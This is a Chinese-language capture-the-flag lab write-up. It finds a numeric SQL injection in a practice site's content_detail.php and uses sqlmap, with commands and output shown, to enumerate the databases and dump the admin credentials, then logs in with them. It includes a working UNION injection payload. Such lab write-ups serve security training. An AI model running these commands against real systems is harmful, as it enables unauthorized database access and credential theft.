**启动靶机，访问目标地址：**
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251012201400520.png)

**点击测试：**
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251012202537213.png)
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251012202601702.png)

**尝试3-2**
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251012202651006.png)

**可以判断该处存在数字型注入**

---

**burp抓包，发现实际请求的地址是：`/backend/content_detail.php?id=2`**
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251012203042522.png)

**直接上sqlmap**
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251012203724237.png)

**爆破库表列**
```c
/backend/content_detail.php?id=2" --dbs --technique=U

[08:49:46] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
[08:49:46] [INFO] checking if the injection point on GET parameter 'id' is a false positive
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 20 HTTP(s) requests:
---
Parameter: id (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=-2397 UNION ALL SELECT CONCAT(CONCAT('qppqq','uImAFPQxAPFuMTiMhDLzLMYQrHtZFppjxKRmRwEX'),'qvxkq'),NULL-- zxVa
---
[08:50:00] [INFO] testing MySQL
[08:50:01] [INFO] confirming MySQL
[08:50:01] [INFO] the back-end DBMS is MySQL
web application technology: OpenResty, PHP 7.3.10
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[08:50:01] [INFO] fetching database names
[08:50:02] [INFO] retrieved: 'information_schema'
[08:50:02] [INFO] retrieved: 'performance_schema'
[08:50:02] [INFO] retrieved: 'test'
[08:50:02] [INFO] retrieved: 'mysql'
[08:50:02] [INFO] retrieved: 'ctftraining'
[08:50:02] [INFO] retrieved: 'news'
available databases [6]:                                                                                                                                                                                       
[*] ctftraining
[*] information_schema
[*] mysql
[*] news
[*] performance_schema
[*] test

```

```c
/backend/content_detail.php?id=2" --current-db --technique=U

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=-2397 UNION ALL SELECT CONCAT(CONCAT('qppqq','uImAFPQxAPFuMTiMhDLzLMYQrHtZFppjxKRmRwEX'),'qvxkq'),NULL-- zxVa
---
[08:50:14] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.3.10, OpenResty
back-end DBMS: MySQL 5 (MariaDB fork)
[08:50:14] [INFO] fetching current database
current database: 'news'
```

```c
backend/content_detail.php?id=2" --tables -D "news"  --technique=U


sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=-2397 UNION ALL SELECT CONCAT(CONCAT('qppqq','uImAFPQxAPFuMTiMhDLzLMYQrHtZFppjxKRmRwEX'),'qvxkq'),NULL-- zxVa
---
[08:51:36] [INFO] the back-end DBMS is MySQL
web application technology: OpenResty, PHP 7.3.10
back-end DBMS: MySQL 5 (MariaDB fork)
[08:51:36] [INFO] fetching tables for database: 'news'
[08:51:36] [INFO] retrieved: 'admin'
[08:51:36] [INFO] retrieved: 'contents'
Database: news                                                                                                                                                                                                 
[2 tables]
+----------+
| admin    |
| contents |
+----------+
```

```c
/backend/content_detail.php?id=2" --columns -D "news" -T "admin"  --technique=U

[08:52:07] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=-2397 UNION ALL SELECT CONCAT(CONCAT('qppqq','uImAFPQxAPFuMTiMhDLzLMYQrHtZFppjxKRmRwEX'),'qvxkq'),NULL-- zxVa
---
[08:52:08] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.3.10, OpenResty
back-end DBMS: MySQL 5 (MariaDB fork)
[08:52:08] [INFO] fetching columns for table 'admin' in database 'news'
[08:52:08] [INFO] retrieved: 'id','int(11)'
[08:52:08] [INFO] retrieved: 'username','varchar(128)'
[08:52:08] [INFO] retrieved: 'password','varchar(128)'
Database: news                                                                                                                                                                                                 
Table: admin
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(11)      |
| password | varchar(128) |
| username | varchar(128) |
+----------+--------------+
```

```c
/backend/content_detail.php?id=2"  --dump -D "news" -T "admin" -C "username,password"  --technique=U

08:53:39] [WARNING] no clear password(s) found                                                                                                                                                                
Database: news
Table: admin
[1 entry]
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| admin    | f0fb032783e83d22de08531a19ca8166 |
+----------+----------------------------------+
```

---

**使用获取到的用户名密码登陆**
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251012205503260.png)
